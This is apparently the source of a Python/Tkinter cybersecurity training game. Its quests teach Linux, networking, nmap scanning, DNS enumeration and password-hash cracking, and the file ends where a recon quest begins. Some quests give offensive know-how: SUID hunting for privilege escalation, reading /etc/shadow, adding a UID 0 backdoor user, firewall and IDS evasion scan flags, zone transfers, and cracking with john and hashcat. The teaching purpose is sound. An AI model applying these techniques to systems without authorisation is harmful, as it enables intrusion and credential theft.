"""
╔══════════════════════════════════════════════════════════════╗
║          CYBERQUEST ACADEMY — Full Cybersecurity RPG        ║
║     Linux • Networking • Web Hacking • Crypto • Defense     ║
║         Beginner to Advanced — Parrot OS Edition            ║
╚══════════════════════════════════════════════════════════════╝

Requirements: Python 3.8+ (standard library only)
Run: python cyberquest_academy.py
"""

import tkinter as tk
from tkinter import messagebox, font as tkfont
import json
from pathlib import Path
from datetime import datetime

# ══════════════════════════════════════════════════════
# SAVE SYSTEM
# ══════════════════════════════════════════════════════

SAVE_DIR = Path.home() / ".cyberquest"
SAVE_FILE = SAVE_DIR / "academy_save.json"

def load_save():
    if SAVE_FILE.exists():
        try:
            with open(SAVE_FILE, "r") as f:
                return json.load(f)
        except:
            pass
    return {
        "completed_quests": [],
        "bonus_completed": [],
        "exam_scores": {},
        "side_quests_done": [],
        "started": datetime.now().isoformat()
    }

def write_save(data):
    SAVE_DIR.mkdir(parents=True, exist_ok=True)
    with open(SAVE_FILE, "w") as f:
        json.dump(data, f, indent=2)

# ══════════════════════════════════════════════════════
# SKILL TREES
# ══════════════════════════════════════════════════════

SKILL_TREES = {
    "linux":      {"name": "Linux Mastery",         "icon": "🐧", "color": "#00ff88"},
    "networking": {"name": "Networking & Protocols", "icon": "🌐", "color": "#00ccff"},
    "crypto":     {"name": "Cryptography",          "icon": "🔐", "color": "#ffcc00"},
    "recon":      {"name": "Recon & OSINT",          "icon": "🔍", "color": "#ff9900"},
    "webhack":    {"name": "Web Hacking",            "icon": "🕸️", "color": "#ff2266"},
    "passwords":  {"name": "Password Attacks",       "icon": "🔑", "color": "#cc44ff"},
    "exploit":    {"name": "System Exploitation",    "icon": "⚡", "color": "#ff4444"},
    "defense":    {"name": "Defensive Security",     "icon": "🛡️", "color": "#4488ff"},
    "governance": {"name": "Security Frameworks",    "icon": "📋", "color": "#44ddaa"},
}

RANKS = [
    {"level": 1,  "title": "Noob",                "xp": 0},
    {"level": 2,  "title": "Script Kiddie",        "xp": 100},
    {"level": 3,  "title": "Terminal Jockey",       "xp": 250},
    {"level": 4,  "title": "Packet Sniffer",        "xp": 450},
    {"level": 5,  "title": "Shell Popper",          "xp": 750},
    {"level": 6,  "title": "Root Hunter",           "xp": 1100},
    {"level": 7,  "title": "Exploit Dev",           "xp": 1600},
    {"level": 8,  "title": "Zero-Day Scout",        "xp": 2200},
    {"level": 9,  "title": "Shadow Operator",       "xp": 3000},
    {"level": 10, "title": "Ghost in the Wire",     "xp": 4000},
    {"level": 11, "title": "Cipher Lord",           "xp": 5200},
    {"level": 12, "title": "White Hat Legend",       "xp": 6500},
]

# ══════════════════════════════════════════════════════
# ALL QUESTS
# ══════════════════════════════════════════════════════

ALL_QUESTS = [

    # ╔══════════════════════════════════════════════╗
    # ║  LINUX MASTERY                               ║
    # ╚══════════════════════════════════════════════╝

    {
        "id": "lx01", "tree": "linux", "tier": 1, "xp": 25,
        "title": "Terminal Awakening",
        "brief": "Navigate the Linux filesystem like a pro",
        "mission": """═══ MISSION — Terminal Awakening ═══

The terminal is your cockpit. Every hacker lives here.

► OBJECTIVES:

  1. KNOW WHERE YOU ARE:
     pwd                    # Print Working Directory
     whoami                 # Who are you logged in as?
     hostname               # What machine is this?

  2. MOVE AROUND:
     ls                     # List files in current directory
     ls -la                 # List ALL files (including hidden) with details
     ls -lah                # Same but human-readable file sizes
     cd /home               # Change to /home directory
     cd ~                   # Go to YOUR home directory
     cd ..                  # Go up one level
     cd -                   # Go back to previous directory

  3. UNDERSTAND THE LINUX DIRECTORY STRUCTURE:
     /           → Root of everything
     /home       → User home directories (your stuff)
     /root       → Root user's home (superuser)
     /etc        → System configuration files (gold mine!)
     /var        → Variable data (logs live here: /var/log)
     /tmp        → Temporary files (anyone can write here!)
     /bin        → Essential commands (ls, cp, cat, etc.)
     /sbin       → System admin commands (need root)
     /usr        → User programs and data
     /opt        → Optional/third-party software
     /dev        → Device files (hardware)
     /proc       → Virtual filesystem (process info)
     /mnt        → Mount points for external drives

  4. EXPLORE IMPORTANT LOCATIONS:
     ls /etc/              # Config files everywhere
     ls /var/log/          # System logs
     ls /tmp/              # Temp files (attackers hide stuff here!)
     cat /etc/hostname     # Machine name
     cat /etc/os-release   # OS version info

► WHY THIS MATTERS:
  Attackers navigate the filesystem to find credentials, configs,
  and sensitive data. Knowing where things live is step one of
  both attacking AND defending a Linux system.

► HACKER MINDSET:
  When you compromise a machine, the first thing you do is explore.
  Where are the config files? Where are the logs? What's in /tmp?
  This is literally the first 5 minutes of post-exploitation.""",
        "bonus": "Run: find /etc -name '*.conf' 2>/dev/null | head -20 — how many config files can you find? List 5 interesting ones in ~/linux_notes.txt",
        "bonus_xp": 10,
    },
    {
        "id": "lx02", "tree": "linux", "tier": 1, "xp": 25,
        "title": "File Commander",
        "brief": "Create, copy, move, and destroy files",
        "mission": """═══ MISSION — File Commander ═══

Master file operations — the bread and butter of Linux.

► OBJECTIVES:

  1. CREATE FILES AND DIRECTORIES:
     touch notes.txt          # Create empty file
     mkdir recon               # Create directory
     mkdir -p lab/targets/web  # Create nested directories
     echo "target: 10.0.0.1" > target.txt    # Write to file
     echo "port: 80" >> target.txt            # Append to file

  2. COPY, MOVE, RENAME:
     cp target.txt backup.txt           # Copy file
     cp -r lab/ lab_backup/             # Copy directory recursively
     mv backup.txt old_backup.txt       # Rename (move)
     mv old_backup.txt /tmp/            # Move to /tmp

  3. DELETE (BE CAREFUL!):
     rm target.txt                      # Delete file
     rm -r lab_backup/                  # Delete directory
     rm -rf /tmp/old_backup.txt         # Force delete, no prompts
     # ⚠️ NEVER run: rm -rf / (deletes EVERYTHING)

  4. VIEW FILE CONTENTS:
     cat target.txt                     # Print entire file
     head -5 /var/log/syslog            # First 5 lines
     tail -20 /var/log/auth.log         # Last 20 lines
     tail -f /var/log/syslog            # Follow in real-time (Ctrl+C to stop)
     less /etc/passwd                   # Scrollable viewer (q to quit)
     wc -l /etc/passwd                  # Count lines

  5. SEARCH FOR FILES:
     find / -name "*.log" 2>/dev/null           # Find all .log files
     find /home -type f -name "*.txt"           # Find .txt files in /home
     find / -perm -4000 2>/dev/null             # Find SUID files (important!)
     locate passwd                               # Fast search (needs updatedb)

  6. SEARCH INSIDE FILES:
     grep "Failed" /var/log/auth.log            # Find lines with "Failed"
     grep -r "password" /etc/ 2>/dev/null       # Search recursively
     grep -i "root" /etc/passwd                 # Case-insensitive
     grep -c "Failed" /var/log/auth.log         # Count matches

► HACKER MINDSET:
  grep is your best friend. Searching logs for "Failed" finds brute
  force attempts. Searching configs for "password" finds credentials.
  find with -perm -4000 finds SUID binaries — a top privilege
  escalation vector.""",
        "bonus": "Create a script ~/cleanup.sh that: creates a directory structure lab/scans lab/reports lab/wordlists, creates a README.txt in each with a description, then lists everything with ls -laR lab/",
        "bonus_xp": 10,
    },
    {
        "id": "lx03", "tree": "linux", "tier": 1, "xp": 30,
        "title": "Permission Enforcer",
        "brief": "Understand Linux permissions and ownership",
        "mission": """═══ MISSION — Permission Enforcer ═══

Permissions control WHO can do WHAT to every file on the system.

► OBJECTIVES:

  1. READ PERMISSIONS:
     ls -la
     # Output: -rwxr-xr-- 1 captain users 4096 Jan 1 12:00 script.sh
     #
     # Breakdown:
     # -        = file type (- = file, d = directory, l = link)
     # rwx      = OWNER permissions (read, write, execute)
     # r-x      = GROUP permissions (read, execute)
     # r--      = OTHERS permissions (read only)
     # captain  = owner
     # users    = group

  2. CHANGE PERMISSIONS:
     chmod 755 script.sh       # rwxr-xr-x (owner: all, others: read+exec)
     chmod 644 notes.txt       # rw-r--r-- (owner: read+write, others: read)
     chmod 600 secret.txt      # rw------- (owner only!)
     chmod +x script.sh        # Add execute permission
     chmod -w notes.txt        # Remove write permission

     # Permission numbers:
     # 4 = read (r)
     # 2 = write (w)
     # 1 = execute (x)
     # Add them up: 7=rwx, 6=rw-, 5=r-x, 4=r--

  3. CHANGE OWNERSHIP:
     sudo chown root:root secret.txt      # Change owner and group
     sudo chown captain:users script.sh   # Give to your user

  4. SPECIAL PERMISSIONS — SUID, SGID, Sticky:
     # SUID (Set User ID) — runs as the FILE OWNER, not the user
     find / -perm -4000 -type f 2>/dev/null    # Find SUID files
     # If /usr/bin/someprog is SUID root, ANY user runs it as root!

     # Sticky bit — only owner can delete files (used on /tmp)
     ls -la /tmp     # Look for 't' at the end: drwxrwxrwt

  5. DANGEROUS PERMISSIONS TO LOOK FOR:
     # World-writable files (anyone can modify):
     find / -perm -o+w -type f 2>/dev/null | head -20
     # World-writable directories:
     find / -perm -o+w -type d 2>/dev/null | head -20

► WHY THIS MATTERS:
  Bad permissions = instant compromise. A world-writable /etc/passwd
  lets any user add a root account. A misconfigured SUID binary
  gives attackers instant root access.

► HACKER MINDSET:
  Privilege escalation checklist:
  1. Find SUID binaries → check GTFOBins.github.io
  2. Find world-writable files in sensitive locations
  3. Check /etc/passwd and /etc/shadow permissions
  4. Look for writable cron jobs or scripts run by root""",
        "bonus": "Run the SUID finder and look up 3 binaries on GTFOBins. Document which ones could be exploited in ~/suid_audit.txt",
        "bonus_xp": 15,
    },
    {
        "id": "lx04", "tree": "linux", "tier": 2, "xp": 40,
        "title": "Process Assassin",
        "brief": "Monitor and manage running processes",
        "mission": """═══ MISSION — Process Assassin ═══

Processes are running programs. Know what's running on your machine.

► OBJECTIVES:

  1. VIEW PROCESSES:
     ps aux                         # All running processes
     ps aux | grep ssh              # Find SSH-related processes
     top                            # Live process monitor (q to quit)
     htop                           # Better live monitor (install: sudo apt install htop)

  2. UNDERSTAND THE OUTPUT:
     # ps aux columns:
     # USER  PID  %CPU  %MEM  VSZ  RSS  TTY  STAT  START  TIME  COMMAND
     # PID = Process ID (unique number for each process)
     # STAT: S=sleeping, R=running, Z=zombie, T=stopped

  3. KILL PROCESSES:
     kill 1234                      # Gracefully stop process 1234
     kill -9 1234                   # FORCE kill (last resort)
     killall firefox                # Kill all processes named firefox
     pkill -f "python scan.py"     # Kill by command pattern

  4. BACKGROUND & FOREGROUND:
     python scan.py &               # Run in background
     jobs                           # List background jobs
     fg %1                          # Bring job 1 to foreground
     Ctrl+Z                         # Suspend current process
     bg %1                          # Resume suspended job in background
     nohup python scan.py &         # Keeps running after you log out

  5. SERVICES (systemd):
     sudo systemctl status ssh            # Check service status
     sudo systemctl start ssh             # Start a service
     sudo systemctl stop ssh              # Stop a service
     sudo systemctl enable ssh            # Start on boot
     sudo systemctl disable ssh           # Don't start on boot
     sudo systemctl list-units --type=service  # All services

  6. SCHEDULED TASKS (cron):
     crontab -l                     # List your cron jobs
     sudo crontab -l                # List root's cron jobs
     crontab -e                     # Edit your cron jobs
     cat /etc/crontab               # System-wide cron jobs
     ls /etc/cron.d/                # More cron configs

     # Cron format: minute hour day month weekday command
     # */5 * * * * /home/captain/scan.sh   ← runs every 5 minutes

► HACKER MINDSET:
  Attackers check for:
  - Cron jobs running scripts they can modify (write to the script = run as root)
  - Services running as root that have vulnerabilities
  - Processes that leak credentials in their command line args
  Check: ps aux | grep -i pass (sometimes passwords show in process args!)""",
        "bonus": "Find all cron jobs on the system (user, root, /etc/cron.d/). Check permissions on every script they reference. Document in ~/cron_audit.txt",
        "bonus_xp": 15,
    },
    {
        "id": "lx05", "tree": "linux", "tier": 2, "xp": 40,
        "title": "User Overlord",
        "brief": "Manage users, groups, and sudo access",
        "mission": """═══ MISSION — User Overlord ═══

Control who can do what on your system.

► OBJECTIVES:

  1. VIEW USERS AND GROUPS:
     cat /etc/passwd           # All user accounts
     cat /etc/shadow           # Password hashes (need root!)
     cat /etc/group            # All groups
     id                        # Your user info
     id captain                # Specific user info
     who                       # Who's logged in now
     w                         # Who's logged in + what they're doing
     last                      # Login history
     lastb                     # Failed login attempts

  2. UNDERSTAND /etc/passwd:
     # captain:x:1000:1000:Captain:/home/captain:/bin/bash
     # username:password:UID:GID:comment:home:shell
     # 'x' means password is in /etc/shadow
     # UID 0 = root (ALWAYS check for unexpected UID 0 accounts!)

  3. UNDERSTAND /etc/shadow:
     # captain:$6$salt$hash:19500:0:99999:7:::
     # $6$ = SHA-512 hash
     # $5$ = SHA-256, $1$ = MD5 (weak!), $y$ = yescrypt

  4. MANAGE USERS:
     sudo adduser testuser              # Create user (interactive)
     sudo useradd -m -s /bin/bash bob   # Create user (non-interactive)
     sudo passwd testuser               # Set/change password
     sudo usermod -aG sudo testuser     # Add to sudo group
     sudo userdel -r testuser           # Delete user + home dir

  5. SUDO CONFIGURATION:
     sudo cat /etc/sudoers              # Sudo rules (DON'T edit directly)
     sudo visudo                        # Safe way to edit sudoers
     sudo -l                            # What can YOU sudo?
     # Check for dangerous sudo rules:
     # captain ALL=(ALL) NOPASSWD: ALL  ← full root, no password!

  6. CHECK FOR SUSPICIOUS ACCOUNTS:
     # UID 0 accounts (should ONLY be root):
     awk -F: '$3 == 0 {print $1}' /etc/passwd
     # Accounts with shells (can login):
     grep -v "nologin\|false" /etc/passwd
     # Empty passwords:
     sudo awk -F: '$2 == "" {print $1}' /etc/shadow

► HACKER MINDSET:
  After compromising a machine, attackers:
  1. Check sudo -l for easy privilege escalation
  2. Read /etc/shadow to crack passwords offline
  3. Add a backdoor user with UID 0
  4. Check for password reuse across services""",
        "bonus": "Audit your system: check for UID 0 accounts, accounts with shells, empty passwords, and dangerous sudo rules. Write a security report in ~/user_audit.txt",
        "bonus_xp": 15,
    },
    {
        "id": "lx06", "tree": "linux", "tier": 3, "xp": 60,
        "title": "Shell Scripter",
        "brief": "Write bash scripts to automate everything",
        "mission": """═══ MISSION — Shell Scripter ═══

Automate repetitive tasks with shell scripts.

► OBJECTIVES:

  1. YOUR FIRST SCRIPT — save as ~/scan.sh:
     #!/bin/bash
     # Simple network scanner
     echo "=== Quick Network Scanner ==="
     echo "Date: $(date)"
     echo ""

     TARGET=$1    # First command-line argument
     if [ -z "$TARGET" ]; then
         echo "Usage: ./scan.sh <target_ip>"
         exit 1
     fi

     echo "Scanning $TARGET..."
     for port in 21 22 80 443 8080 3306; do
         (echo >/dev/tcp/$TARGET/$port) 2>/dev/null && \\
             echo "  Port $port: OPEN" || \\
             echo "  Port $port: closed"
     done
     echo "Scan complete!"

  2. MAKE IT EXECUTABLE AND RUN:
     chmod +x ~/scan.sh
     ./scan.sh 127.0.0.1

  3. VARIABLES AND INPUT:
     #!/bin/bash
     read -p "Enter target IP: " TARGET
     read -p "Enter port range start: " START
     read -p "Enter port range end: " END
     echo "Scanning $TARGET ports $START-$END..."

  4. LOOPS:
     # For loop
     for ip in 192.168.1.{1..10}; do
         ping -c 1 -W 1 $ip &>/dev/null && echo "$ip is UP"
     done

     # While loop reading a file
     while IFS= read -r line; do
         echo "Processing: $line"
     done < targets.txt

  5. CONDITIONALS:
     if [ -f "/etc/shadow" ]; then
         echo "Shadow file exists"
     fi

     if [ "$(id -u)" -ne 0 ]; then
         echo "Run as root!"
         exit 1
     fi

  6. FUNCTIONS:
     check_port() {
         local host=$1
         local port=$2
         (echo >/dev/tcp/$host/$port) 2>/dev/null
         return $?
     }

     if check_port "127.0.0.1" 22; then
         echo "SSH is running"
     fi

► CHALLENGE:
  Write a system audit script that checks:
  - SUID binaries, world-writable files
  - Users with UID 0, empty passwords
  - Open ports, running services
  - Cron jobs, sudo rules
  Save all output to ~/audit_report_$(date +%Y%m%d).txt""",
        "bonus": "Create the full audit script described above. Make it colorized (use echo -e with ANSI codes) and generate a clean report.",
        "bonus_xp": 20,
    },

    # ╔══════════════════════════════════════════════╗
    # ║  NETWORKING & PROTOCOLS                      ║
    # ╚══════════════════════════════════════════════╝

    {
        "id": "net01", "tree": "networking", "tier": 1, "xp": 25,
        "title": "Network Foundations",
        "brief": "IP addresses, subnets, and the OSI model",
        "mission": """═══ MISSION — Network Foundations ═══

Before you hack networks, you need to understand how they work.

► OBJECTIVES:

  1. THE OSI MODEL (memorize this!):
     Layer 7: Application   → HTTP, FTP, SSH, DNS (what users see)
     Layer 6: Presentation  → Encryption/SSL, data formatting
     Layer 5: Session       → Connection management
     Layer 4: Transport     → TCP (reliable), UDP (fast)
     Layer 3: Network       → IP addresses, routing
     Layer 2: Data Link     → MAC addresses, switches
     Layer 1: Physical      → Cables, wireless signals

     Memory trick: "All People Seem To Need Data Processing"

  2. IP ADDRESSES:
     # Your IP info:
     ip a
     ip addr show eth0

     # IPv4: 192.168.1.100 (4 octets, 0-255 each)
     # Private ranges (non-routable):
     #   10.0.0.0/8        (10.x.x.x)
     #   172.16.0.0/12     (172.16-31.x.x)
     #   192.168.0.0/16    (192.168.x.x)

  3. SUBNETS (CIDR notation):
     # /24 = 255.255.255.0 = 256 addresses (254 usable)
     # /16 = 255.255.0.0   = 65,536 addresses
     # /8  = 255.0.0.0     = 16 million addresses
     #
     # 192.168.1.0/24 means: 192.168.1.0 to 192.168.1.255

  4. KEY COMMANDS:
     ip a                           # Your interfaces and IPs
     ip route                       # Routing table
     cat /etc/resolv.conf           # DNS servers
     ping -c 4 8.8.8.8             # Test connectivity
     traceroute 8.8.8.8            # Path to destination
     nslookup google.com            # DNS lookup
     dig google.com                 # Detailed DNS lookup

  5. TCP vs UDP:
     # TCP: Three-way handshake (SYN → SYN-ACK → ACK)
     #   Reliable, ordered, connection-based
     #   Used by: HTTP, SSH, FTP, SMTP
     #
     # UDP: Fire and forget
     #   Fast, no connection, no guarantee
     #   Used by: DNS, DHCP, streaming, gaming

  6. COMMON PORTS (memorize these!):
     20/21  FTP        22  SSH         23  Telnet
     25     SMTP       53  DNS         67/68  DHCP
     80     HTTP       110 POP3        143  IMAP
     443    HTTPS      445 SMB         3306  MySQL
     3389   RDP        5432 PostgreSQL 8080  HTTP-alt

► TEST YOURSELF:
  Run: ss -tulnp
  Can you identify every listening service by its port number?""",
        "bonus": "Draw the OSI model on paper with a real-world example at each layer (e.g., Layer 7: your browser requesting a web page). Take a photo or write it in ~/osi_notes.txt",
        "bonus_xp": 10,
    },
    {
        "id": "net02", "tree": "networking", "tier": 1, "xp": 30,
        "title": "Packet Hunter",
        "brief": "Capture and analyze network traffic",
        "mission": """═══ MISSION — Packet Hunter ═══

See what's actually traveling across your network.

► OBJECTIVES:

  1. TCPDUMP — command-line packet capture:
     sudo tcpdump -i eth0 -c 20                # Capture 20 packets
     sudo tcpdump -i eth0 port 80              # Only HTTP traffic
     sudo tcpdump -i eth0 host 192.168.1.1     # Only traffic to/from IP
     sudo tcpdump -i eth0 -w capture.pcap      # Save to file
     sudo tcpdump -r capture.pcap              # Read saved capture
     sudo tcpdump -i eth0 -A port 80           # Show ASCII content

  2. READ TCPDUMP OUTPUT:
     # 12:34:56.789 IP 192.168.1.100.45678 > 93.184.216.34.80: Flags [S]
     # Time          Source IP:Port     > Dest IP:Port        TCP Flags
     #
     # Flags: [S]=SYN  [S.]=SYN-ACK  [.]=ACK  [P.]=PUSH-ACK
     #        [F.]=FIN-ACK  [R]=RESET

  3. WIRESHARK (GUI packet analyzer):
     wireshark &                                # Launch Wireshark
     # Or open a capture file:
     wireshark ~/capture.pcap

     # Useful Wireshark filters:
     # tcp.port == 80        → HTTP traffic
     # ip.addr == 192.168.1.1  → Specific host
     # http.request           → HTTP requests only
     # tcp.flags.syn == 1     → SYN packets (connection starts)
     # dns                    → DNS queries

  4. GENERATE TRAFFIC TO CAPTURE:
     # In one terminal: start capture
     sudo tcpdump -i eth0 -w ~/lab_capture.pcap &
     # In another: generate traffic
     curl http://example.com
     ping -c 3 8.8.8.8
     nslookup google.com
     # Stop capture: Ctrl+C or kill the tcpdump process

  5. ARP — Address Resolution Protocol:
     arp -a                          # View ARP table (IP↔MAC mappings)
     sudo tcpdump -i eth0 arp        # Watch ARP traffic
     ip neigh                        # Another way to see ARP table

► WHY THIS MATTERS:
  Every IDS, every forensic investigation, every MITM attack
  starts with packet capture. If you can read packets, you can
  see EVERYTHING happening on a network.

► HACKER MINDSET:
  Unencrypted traffic (HTTP, FTP, Telnet) exposes credentials in
  plaintext. Try: sudo tcpdump -i eth0 -A port 80 — you can
  literally READ what people are browsing. This is why HTTPS matters.""",
        "bonus": "Capture 100 packets, open in Wireshark, and find: 1) A DNS query, 2) A TCP handshake (SYN→SYN-ACK→ACK), 3) Any unencrypted data. Screenshot or document in ~/packet_analysis.txt",
        "bonus_xp": 15,
    },
    {
        "id": "net03", "tree": "networking", "tier": 2, "xp": 45,
        "title": "Nmap Ninja",
        "brief": "Master the network scanner",
        "mission": """═══ MISSION — Nmap Ninja ═══

Nmap is THE network scanning tool. Learn it inside out.

► OBJECTIVES:

  1. HOST DISCOVERY:
     nmap -sn 192.168.1.0/24         # Ping sweep (find live hosts)
     nmap -sn -PS 192.168.1.0/24     # TCP SYN ping
     nmap -sn -PA 192.168.1.0/24     # TCP ACK ping

  2. PORT SCANNING:
     nmap 192.168.1.1                 # Top 1000 ports
     nmap -p 1-65535 192.168.1.1     # ALL ports
     nmap -p 22,80,443 192.168.1.1   # Specific ports
     nmap -p- 192.168.1.1            # Shorthand for all ports
     nmap --top-ports 100 192.168.1.1  # Top 100 common ports

  3. SCAN TYPES:
     nmap -sS 192.168.1.1     # SYN scan (stealth, default)
     nmap -sT 192.168.1.1     # TCP connect scan (noisy but reliable)
     nmap -sU 192.168.1.1     # UDP scan (slow but important)
     nmap -sV 192.168.1.1     # Version detection
     nmap -O 192.168.1.1      # OS detection
     nmap -A 192.168.1.1      # Aggressive (OS + version + scripts + traceroute)

  4. NSE SCRIPTS (Nmap Scripting Engine):
     nmap --script=default 192.168.1.1          # Default scripts
     nmap --script=vuln 192.168.1.1             # Vulnerability scripts
     nmap --script=http-enum 192.168.1.1        # Web directory enum
     nmap --script=smb-vuln* 192.168.1.1        # SMB vulnerabilities
     ls /usr/share/nmap/scripts/ | wc -l        # How many scripts?

  5. OUTPUT FORMATS:
     nmap -oN scan.txt 192.168.1.1    # Normal output
     nmap -oX scan.xml 192.168.1.1    # XML output
     nmap -oG scan.gnmap 192.168.1.1  # Greppable output
     nmap -oA scan_all 192.168.1.1    # All formats at once

  6. STEALTH & EVASION:
     nmap -T0 192.168.1.1       # Paranoid (super slow, avoids IDS)
     nmap -T1 192.168.1.1       # Sneaky
     nmap -T3 192.168.1.1       # Normal (default)
     nmap -T5 192.168.1.1       # Insane (fast, noisy)
     nmap -f 192.168.1.1        # Fragment packets (evade firewalls)
     nmap -D RND:5 192.168.1.1  # Decoy scan (hide among fake IPs)

► ⚠️ ONLY scan machines you OWN or have permission to test.
  Scanning without permission is illegal in most jurisdictions.""",
        "bonus": "Scan your own machine (localhost or your Parrot IP) with: nmap -sV -sC -O -oA ~/my_scan localhost — then read all 3 output files and identify every running service.",
        "bonus_xp": 15,
    },
    {
        "id": "net04", "tree": "networking", "tier": 3, "xp": 55,
        "title": "DNS Deep Dive",
        "brief": "DNS reconnaissance and enumeration",
        "mission": """═══ MISSION — DNS Deep Dive ═══

DNS translates names to IPs. It also leaks TONS of info.

► OBJECTIVES:

  1. DNS BASICS:
     nslookup example.com              # Simple lookup
     dig example.com                    # Detailed lookup
     dig example.com ANY               # All record types
     dig example.com MX                # Mail servers
     dig example.com NS                # Name servers
     dig example.com TXT               # TXT records (SPF, DKIM, etc.)
     dig -x 93.184.216.34              # Reverse lookup (IP → name)
     host example.com                  # Simple tool

  2. DNS RECORD TYPES:
     A      → IPv4 address
     AAAA   → IPv6 address
     MX     → Mail server
     NS     → Name server (who controls the DNS)
     TXT    → Text records (SPF, DKIM, verification)
     CNAME  → Alias (points to another domain)
     SOA    → Start of Authority (zone info)
     PTR    → Reverse DNS (IP → name)

  3. DNS ENUMERATION TOOLS:
     # Subdomain discovery:
     dnsrecon -d example.com -t std
     dnsenum example.com
     fierce --domain example.com

     # Zone transfer attempt (misconfiguration = jackpot):
     dig axfr @ns1.example.com example.com

  4. DNS IN SECURITY:
     # Check if domain has email security:
     dig example.com TXT | grep "v=spf"     # SPF record
     dig _dmarc.example.com TXT             # DMARC policy
     dig default._domainkey.example.com TXT  # DKIM key

  5. /etc/hosts — local DNS override:
     cat /etc/hosts
     # You can add entries:
     # 192.168.1.100  target.lab
     # Now 'ping target.lab' goes to 192.168.1.100

► HACKER MINDSET:
  DNS zone transfers expose the ENTIRE DNS zone — every subdomain,
  every IP, every mail server. It's like getting a map of the
  entire network. Most servers block this now, but misconfigured
  ones still exist. Always check.""",
        "bonus": "Pick a domain you own. Run full DNS recon: dig for A, MX, NS, TXT records. Try a zone transfer. Check SPF/DMARC. Document everything in ~/dns_recon.txt",
        "bonus_xp": 15,
    },

    # ╔══════════════════════════════════════════════╗
    # ║  CRYPTOGRAPHY                                ║
    # ╚══════════════════════════════════════════════╝

    {
        "id": "cr01", "tree": "crypto", "tier": 1, "xp": 25,
        "title": "Crypto Foundations",
        "brief": "The CIA Triad and crypto basics",
        "mission": """═══ MISSION — Crypto Foundations ═══

The CIA Triad is the FOUNDATION of all information security.

► THE CIA TRIAD:

  C — CONFIDENTIALITY
    Only authorized people can ACCESS the data.
    → Encryption, access controls, permissions
    → Threat: eavesdropping, data breaches, shoulder surfing
    → Example: HTTPS encrypts web traffic so only you and the
      server can read it.

  I — INTEGRITY
    Data hasn't been TAMPERED with.
    → Hashing, digital signatures, checksums
    → Threat: man-in-the-middle, data corruption
    → Example: sha256sum verifies a downloaded file wasn't modified.

  A — AVAILABILITY
    Systems and data are ACCESSIBLE when needed.
    → Redundancy, backups, DDoS protection
    → Threat: DDoS attacks, ransomware, hardware failure
    → Example: Load balancers distribute traffic so one server
      going down doesn't take everything offline.

► OBJECTIVES:

  1. HASHING (one-way, integrity):
     echo -n "password123" | md5sum
     echo -n "password123" | sha256sum
     echo -n "password124" | sha256sum     # Tiny change = completely different hash!
     sha256sum /usr/bin/ls                  # Verify file integrity

  2. ENCODING vs ENCRYPTION vs HASHING:
     # Encoding: transforms data format (NOT security!)
     echo -n "hello" | base64              # Encode
     echo "aGVsbG8=" | base64 -d           # Decode
     # Anyone can decode — it's NOT encryption!

     # Hashing: one-way function (can't reverse)
     # Used for: password storage, file integrity

     # Encryption: two-way with a key
     # Used for: protecting data in transit/at rest

  3. SYMMETRIC vs ASYMMETRIC ENCRYPTION:
     # Symmetric: same key to encrypt and decrypt
     #   AES, DES, 3DES, ChaCha20
     #   Fast but key sharing is a problem

     # Asymmetric: public key + private key pair
     #   RSA, ECC, Ed25519
     #   Public key encrypts, private key decrypts
     #   Slow but solves key distribution

  4. TRY IT:
     # Generate a key pair:
     openssl genrsa -out private.pem 2048
     openssl rsa -in private.pem -pubout -out public.pem
     cat public.pem
     cat private.pem

     # Encrypt a file:
     echo "TOP SECRET DATA" > secret.txt
     openssl rsautl -encrypt -pubin -inkey public.pem -in secret.txt -out secret.enc
     cat secret.enc    # Unreadable!

     # Decrypt:
     openssl rsautl -decrypt -inkey private.pem -in secret.enc
     # "TOP SECRET DATA" — back to normal!

► WHY THIS MATTERS:
  Every secure connection (HTTPS, SSH, VPN) uses crypto.
  Understanding it lets you know when something is truly
  secure vs. when it just LOOKS secure.""",
        "bonus": "Create a file, hash it with SHA256, modify one byte, hash again. Compare hashes. Then encrypt/decrypt a file with openssl. Document the process in ~/crypto_lab.txt",
        "bonus_xp": 10,
    },
    {
        "id": "cr02", "tree": "crypto", "tier": 2, "xp": 40,
        "title": "Hash Cracking Lab",
        "brief": "Understand how password hashes are attacked",
        "mission": """═══ MISSION — Hash Cracking Lab ═══

If you can't crack it, you can't defend against cracking.

► OBJECTIVES:

  1. UNDERSTAND HASH TYPES:
     $1$  → MD5crypt (weak, legacy)
     $5$  → SHA-256crypt
     $6$  → SHA-512crypt (common on modern Linux)
     $y$  → yescrypt (newest, strongest)
     $2b$ → bcrypt (used by many web apps)

  2. CREATE TEST HASHES:
     # MD5 (fast to crack — bad for passwords):
     echo -n "password123" | md5sum

     # Generate a Linux-style password hash:
     openssl passwd -6 -salt randomsalt "password123"

  3. GET YOUR WORDLISTS:
     # Parrot OS includes wordlists:
     ls /usr/share/wordlists/
     ls /usr/share/wordlists/rockyou.txt.gz

     # Decompress rockyou if needed:
     sudo gunzip /usr/share/wordlists/rockyou.txt.gz

     # How big is it?
     wc -l /usr/share/wordlists/rockyou.txt
     # ~14 million passwords from a real breach!

     # Preview it:
     head -20 /usr/share/wordlists/rockyou.txt

  4. CRACK WITH JOHN THE RIPPER:
     # Create a test hash file:
     echo 'testuser:$6$randomsalt$YOUR_HASH_HERE' > ~/test_hashes.txt

     # Crack it:
     john --wordlist=/usr/share/wordlists/rockyou.txt ~/test_hashes.txt

     # Check results:
     john --show ~/test_hashes.txt

  5. CRACK WITH HASHCAT (GPU-accelerated):
     # Hash mode numbers: -m 0 = MD5, -m 1000 = NTLM, -m 1800 = SHA-512crypt
     hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt

     # Attack modes:
     # -a 0 = dictionary (wordlist)
     # -a 1 = combination (word1+word2)
     # -a 3 = brute force (mask)
     # -a 6 = wordlist + mask (hybrid)

  6. DEFEND AGAINST CRACKING:
     - Use strong, unique passwords (16+ chars, mixed)
     - Use slow hash algorithms (bcrypt, scrypt, argon2)
     - Add per-user salts (prevents rainbow tables)
     - Implement account lockout after N failures
     - Enable MFA (even a cracked password isn't enough)

► ⚠️ Only crack hashes from YOUR OWN systems or authorized tests.""",
        "bonus": "Create 5 test accounts with different password strengths (weak to strong). Extract their hashes from /etc/shadow (or create them with openssl), then crack them with John. Document which ones fell and how long each took.",
        "bonus_xp": 15,
    },

    # ╔══════════════════════════════════════════════╗
    # ║  RECON & OSINT                               ║
    # ╚══════════════════════════════════════════════╝

    {
        "id": "rc01", "tree": "recon", "tier": 1, "xp": 25,
        "title": "Self Scanner",
        "brief": "Scan your own machine — see what attackers see",
        "mission": """═══ MISSION — Self Scanner ═══

